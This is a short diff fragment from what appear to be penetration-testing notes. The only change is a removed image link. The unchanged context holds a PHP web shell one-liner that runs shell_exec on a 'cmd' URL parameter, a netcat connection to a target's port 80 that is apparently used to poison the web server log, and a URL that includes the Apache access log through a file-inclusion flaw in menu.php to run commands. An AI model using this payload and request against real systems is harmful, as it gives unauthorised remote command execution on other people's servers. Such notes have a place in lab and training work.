@@ -6,7 +6,6 @@ nc -nv $TARGET 80
 <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
 ```
 What the log file looks like:
-![[Pasted image 20220506100915.png]]
 ```bash
 http://$TARGET/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
 ```
